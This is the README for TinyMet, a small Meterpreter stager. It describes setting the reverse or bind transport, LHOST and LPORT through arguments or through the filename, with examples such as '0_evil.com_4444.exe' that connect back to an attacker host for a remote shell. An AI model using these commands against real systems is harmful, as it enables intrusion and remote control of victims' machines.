TinyMet is a tiny “4.5 kilobytes” flexible meterpreter stager, which supports multiple
meterpreter transports, setting LPORT and LHOST during runtime.
Transport, LPORT and LHOST are set during runtime through either of the following:
Command line arguments.
Naming the .exe file in a special way.

What's new in v0.2:
Now tinymet can parse the Transport, LPORT and LHOST from its own filename
through separating them by underscore
Example: "0_evil.com_4444.exe" will use reverse_tcp, LHOST=evil.com, LPORT=4444
This makes tinymet more (double-click/payload-like/argument-less) friendly.
Available transports are as follows:
0: reverse_tcp
1: reverse_http
2: reverse_https
3: bind_tcp

Usage#1:
tinymet.exe TRANSPORT LHOST LPORT
Example:
"tinymet.exe 2 host.com 443" Will use reverse_https and connect to host.com:443

Usage#2: name the file using the folowing convention and run without args:
TRANSPORT_LHOST_LPORT.exe
Example:
Setting the filename to "2_host.com_443.exe" and running it without args will do
exactly the same as Example#1.
